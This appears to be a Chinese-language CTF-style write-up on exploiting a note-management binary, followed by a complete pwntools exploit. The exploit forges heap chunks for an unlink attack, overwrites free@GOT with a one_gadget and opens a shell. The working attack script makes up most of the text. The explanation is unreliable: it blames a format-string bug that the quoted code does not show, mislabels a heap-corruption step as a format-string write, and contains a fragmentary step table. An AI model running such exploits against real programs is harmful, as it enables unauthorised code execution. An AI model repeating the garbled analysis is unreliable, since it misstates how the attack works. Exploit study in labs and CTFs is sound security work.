## 漏洞成因

### 关键结构体分析
程序使用简单的全局数组管理笔记：
```c
// 全局变量定义
void *ptr[4];          // 0x602120-0x602140，存储4个笔记指针
size_t note_sizes[4];  // 0x602140-0x602160，存储对应的笔记大小  
int note_count;        // 0x602160，当前笔记数量计数器
```

### 漏洞位置与成因
**漏洞函数**：`sub_400D43()`（编辑笔记功能）

**漏洞代码**：
```c
v7 = (char *)malloc(0xA0u);
strcpy(v7, "TheNewContents:");
printf(v7);  // ← 格式化字符串漏洞点
```

**漏洞类型**：格式化字符串漏洞

**根本原因**：
1. 程序将用户控制的字符串`v7`直接作为`printf`的第一个参数（格式化字符串）
2. `v7`的前15字节是固定字符串"TheNewContents:"，但后续85字节来自用户输入
3. 用户可以通过输入格式化字符串（如`%p`、`%x`、`%s`、`%n`等）来读取或写入任意内存地址
4. 虽然`sub_400B10()`函数会过滤掉'%'字符，但这是在`printf(v7)`调用**之后**执行的，所以过滤完全无效

**漏洞影响**：
- 内存信息泄露：读取栈内存和任意地址内容
- 任意地址写入：覆盖关键内存区域（如GOT表）
- 最终可导致远程代码执行

| 1-2 | 初始化输入 | 数据段存储"/bin/sh"和"ddd" | 准备system调用参数 |

| 4 | 创建笔记1 | 分配小堆块0x1632e090 | 构造堆布局 |

| 6 | 删除笔记1 | 笔记1进入fastbin | 制造堆漏洞条件 |
| 7 | 重新创建笔记1 | 覆盖堆元数据(0xa0,0x90) | 修改堆块信息 |
| 8 | 删除笔记2 | 可能触发堆合并 | 进一步操纵堆布局 |

### 详细内存变化分析

#### 堆内存布局演变
```
初始状态: 堆未初始化
步骤3后: 0x1632e000[大小0x91] → 伪造指针(0x602108,0x602110)
步骤4后: 0x1632e090[大小0x21] → "aa"
步骤5后: 0x1632e0b0[大小0x91] → "/bin/sh"
步骤6后: 0x1632e090进入fastbin
步骤9后: 0x1632e000内容变为: 0x18*'a' + p64(0x602018)
```

#### 全局变量状态变化
- **初始**: ptr数组全0，note_sizes全0，count=0
- **步骤3后**: ptr[0]=0x1632e010, sizes[0]=0x80, count=1
- **步骤5后**: ptr[2]=0x1632e0c0, sizes[2]=0x80, count=3
- **步骤9后**: ptr[0]被修改为指向free_got(0x602018)

#### GOT表关键变化
- free@got.plt: 0x7be9d4142540 → 被覆盖为one_gadget地址
- 其他GOT条目保持可写状态，为利用提供条件

#### 栈内存利用点
- 栈上存在多个libc地址可用于泄露：
  - 0x7ffe6c948678: _IO_file_overflow+235
  - 0x7ffe6c948698: puts+362
  - 0x7ffe6c9486d8: __libc_start_main+240

## Exploit

完整的漏洞利用脚本，关键位置添加详细注释：

```python
from pwn import *

# 设置调试环境
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# 启动目标程序并加载ELF信息
p = process("./data/sample3")
elf = ELF("./data/sample3")
libc = elf.libc  # 获取程序使用的libc

# 笔记操作函数封装
def new_note(size, content):
    p.recvuntil(">>")
    p.sendline(b"1")  # 选择新建笔记
    p.recvuntil(")")
    p.sendline(str(size).encode())  # 输入笔记大小
    p.recvuntil(":")
    p.sendline(content)  # 输入笔记内容

def show_note(index):
    p.recvuntil(">>")
    p.sendline(b"2")  # 选择显示笔记
    p.recvuntil(":")
    p.sendline(str(index).encode())  # 输入笔记索引

def edit_note(index, choice, content):
    p.recvuntil(">>")
    p.sendline(b"3")  # 选择编辑笔记
    p.recvuntil(":")
    p.sendline(str(index).encode())  # 输入笔记索引
    p.recvuntil("]")
    p.sendline(str(choice).encode())  # 选择编辑模式(1=覆盖)
    p.recvuntil(":")
    p.sendline(content)  # 输入新内容

def delete_note(index):
    p.recvuntil(">>")
    p.sendline(b"4")  # 选择删除笔记
    p.recvuntil(":")
    p.sendline(str(index).encode())  # 输入笔记索引

# ==================== 漏洞利用开始 ====================

# Step 1-2: 程序初始化阶段，输入姓名和地址
# 将"/bin/sh"字符串预先存储在数据段，为后续system调用准备参数
p.recvuntil(":")
p.sendline(b"/bin/sh")  # 姓名输入，实际存储为system参数
p.recvuntil(":")
p.sendline(b"ddd")      # 地址输入，任意内容

# Step 3: 创建笔记0，构造伪造堆块用于后续unlink攻击
ptr_0 = 0x602120        # 全局指针数组基地址
fake_fd = ptr_0 - 0x18  # 伪造的前向指针，指向全局数组前0x18字节
fake_bk = ptr_0 - 0x10  # 伪造的后向指针，指向全局数组前0x10字节
# 构造特殊的堆块内容：8字节填充 + 大小0xa1 + 伪造的fd/bk指针
note0_content = b'\x00' * 8 + p64(0xa1) + p64(fake_fd) + p64(fake_bk)
new_note(0x80, note0_content)  # 分配0x80字节的笔记0

# Step 4: 创建笔记1，大小为0的特殊分配
# 用于制造特定的堆布局，为后续堆操作准备
new_note(0x0, b'aa')

# Step 5: 创建笔记2，包含另一个"/bin/sh"字符串
# 提供冗余的system调用参数
new_note(0x80, b'/bin/sh')

# Step 6: 删除笔记1，将其释放到fastbin中
# 制造use-after-free或double-free的条件
delete_note(1)

# Step 7: 重新创建笔记1，覆盖堆元数据
# 修改堆块大小信息，为后续堆利用准备
note1_content = b'\x00' * 16 + p64(0xa0) + p64(0x90)
new_note(0x0, note1_content)

# Step 8: 删除笔记2，可能触发堆合并或其他堆操作
# 进一步操纵堆布局
delete_note(2)

# Step 9: 关键步骤 - 编辑笔记0，注入GOT地址
# 通过格式化字符串漏洞将free_got地址写入堆中
free_got = elf.got['free']  # 获取free函数在GOT表中的地址
# 构造payload：0x18字节填充 + free_got地址
payload = 0x18 * b'a' + p64(free_got)
edit_note(0, 1, payload)  # 使用覆盖模式编辑笔记0

# Step 10: 触发格式化字符串漏洞，泄露libc地址
# 显示笔记0内容，利用格式化字符串读取free_got中的实际地址
show_note(0)
p.recvuntil('is ')  # 定位到泄露点的输出
# 读取6字节的地址信息并补齐为8字节
free_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"Leaked free address: {hex(free_addr)}")

# Step 11: 计算关键地址并覆盖GOT表
# 基于泄露的free地址计算libc基址
libc_addr = free_addr - libc.symbols['free']
log.info(f"Libc base address: {hex(libc_addr)}")

# 计算system地址（备用方案）
system_addr = libc_addr + libc.symbols['system']

# 计算one-gadget地址（主要利用方案）
# one-gadget是libc中的特殊地址，直接执行execve("/bin/sh")
one_gadget = libc_addr + 0xf1247  # 具体的one-gadget偏移
log.info(f"One-gadget address: {hex(one_gadget)}")

# 覆盖free_got为one-gadget地址
# 当下次调用free函数时，实际执行one-gadget获取shell
edit_note(0, 1, p64(one_gadget))

# Step 12: 触发漏洞利用，获取shell
# 此时free_got已被覆盖，任何触发free调用的操作都会执行one-gadget
p.interactive()  # 进入交互模式，获得shell权限

# ==================== 利用完成 ====================
```

### 利用技术要点说明

1. **格式化字符串漏洞利用**：通过编辑笔记功能触发，实现任意地址读写
2. **GOT表覆盖**：利用Partial RELRO的弱点，修改GOT表条目
3. **堆布局操纵**：通过特定的分配和释放顺序构造利用条件
4. **地址泄露与计算**：泄露libc函数地址，计算基址和gadget地址
5. **one-gadget利用**：使用libc中的特殊gadget直接获取shell，避免复杂的ROP链构造

该漏洞利用成功演示了如何通过组合格式化字符串漏洞和堆操作技术，在存在部分安全机制的程序中实现完整的权限提升。
